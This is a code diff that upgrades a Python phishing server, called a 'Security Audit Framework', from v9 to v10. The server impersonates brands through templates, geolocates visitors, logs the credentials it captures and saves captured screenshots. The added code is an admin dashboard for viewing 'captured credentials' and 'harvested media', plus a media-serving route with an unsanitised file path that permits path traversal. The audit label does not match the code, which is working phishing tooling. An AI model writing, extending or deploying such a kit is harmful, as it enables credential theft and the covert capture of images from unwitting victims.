@@ -287,6 +287,58 @@ def generate_html(template):
             .replace("__NAME__", template['name'])
             .replace("__MASK_HINT__", template['mask_hint']))
 
+def generate_admin_dashboard():
+    log_content = ""
+    if os.path.exists(LOG_FILE):
+        with open(LOG_FILE, "r") as f:
+            log_content = f.read()
+
+    screenshots = []
+    if os.path.exists(MEDIA_DIR):
+        screenshots = os.listdir(MEDIA_DIR)
+
+    return f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Framework v10 - Admin Dashboard</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; background: #121212; color: #e0e0e0; margin: 0; padding: 20px; }}
+        h1 {{ color: #00ffcc; }}
+        .container {{ max-width: 1000px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }}
+        pre {{ background: #2d2d2d; padding: 15px; border-radius: 5px; overflow-x: auto; color: #00ff66; font-size: 13px; }}
+        .section {{ margin-top: 30px; }}
+        .screenshots-grid {{ display: flex; flex-wrap: wrap; gap: 15px; margin-top: 15px; }}
+        .thumb {{ border: 1px solid #444; border-radius: 5px; padding: 5px; background: #252525; text-align: center; }}
+        .thumb img {{ max-width: 200px; height: auto; border-radius: 3px; }}
+        .thumb p {{ font-size: 11px; color: #aaa; margin: 5px 0 0 0; }}
+        .btn {{ display: inline-block; padding: 10px 20px; background: #00ffcc; color: #121212; text-decoration: none; font-weight: bold; border-radius: 4px; margin-bottom: 20px; }}
+        .btn:hover {{ background: #00b38f; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ Security Audit Framework v10 - Admin Dashboard</h1>
+        <p>Live session telemetry, captured credentials, and harvested media monitor.</p>
+        <a href="/" class="btn" target="_blank">🌐 Open Phishing Portal Preview</a>
+        
+        <div class="section">
+            <h3>📊 Audit Activity Logs (audit_results.log)</h3>
+            <pre>{log_content if log_content else "No audit logs recorded yet."}</pre>
+        </div>
+
+        <div class="section">
+            <h3>📸 Captured Screenshots ({len(screenshots)})</h3>
+            <div class="screenshots-grid">
+                {"".join([f'<div class="thumb"><img src="/media/{img}"><p>{img}</p></div>' for img in screenshots]) if screenshots else "<p>No screenshots captured yet.</p>"}
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+"""
+
 def get_geolocation(ip):
     if ip in ["127.0.0.1", "localhost", "::1"]:
         return {"country": "Local Network", "city": "Local", "isp": "Local"}
@@ -319,7 +371,28 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
         return self.client_address[0]
 
     def do_GET(self):
-        if self.path == '/' or self.path == '/index.html' or f"/{SELECTED_TEMPLATE['mask_hint']}" in self.path:
+        if self.path == '/admin-panel':
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            self.wfile.write(generate_admin_dashboard().encode('utf-8'))
+        elif self.path.startswith('/media/'):
+            filename = self.path.replace('/media/', '')
+            filepath = os.path.join(MEDIA_DIR, filename)
+            if os.path.exists(filepath):
+                self.send_response(200)
+                if filename.endswith('.png'):
+                    self.send_header("Content-type", "image/png")
+                else:
+                    self.send_header("Content-type", "application/octet-stream")
+                self.end_headers()
+                with open(filepath, 'rb') as f:
+                    self.wfile.write(f.read())
+            else:
+                self.send_response(404)
+                self.end_headers()
+                self.wfile.write(b"Media Not Found")
+        elif self.path == '/' or self.path == '/index.html' or f"/{SELECTED_TEMPLATE['mask_hint']}" in self.path:
             client_ip = self.get_client_ip()
             geo = get_geolocation(client_ip)
             trigger_beep()
@@ -451,7 +524,7 @@ class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
 def select_template():
     global SELECTED_TEMPLATE
     print("\n==============================================")
-    print("   ADVANCED SECURITY AUDIT FRAMEWORK v9       ")
+    print("   ADVANCED SECURITY AUDIT FRAMEWORK v10      ")
     print("==============================================")
     print(" Please select a target template / brand:")
     print("----------------------------------------------")
@@ -470,13 +543,14 @@ def run_server():
     select_template()
     server_address = ('', PORT)
     httpd = ThreadedHTTPServer(server_address, SecurityAuditHandler)
-    print(f"\033[96m[*] Framework v9 running on port {PORT}...\033[0m")
+    print(f"\033[96m[*] Framework v10 running on port {PORT}...\033[0m")
+    print(f"\033[96m[*] Admin Dashboard available at: http://localhost:{PORT}/admin-panel\033[0m")
     print(f"\033[96m[*] Logging captured data to {LOG_FILE}\033[0m")
     print(f"\033[96m[*] Captured media will be saved in {MEDIA_DIR}/\033[0m")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("\n\033[91m[-] Shutting down framework v9.\033[0m")
+        print("\n\033[91m[-] Shutting down framework v10.\033[0m")
         httpd.server_close()
 
 if __name__ == '__main__':
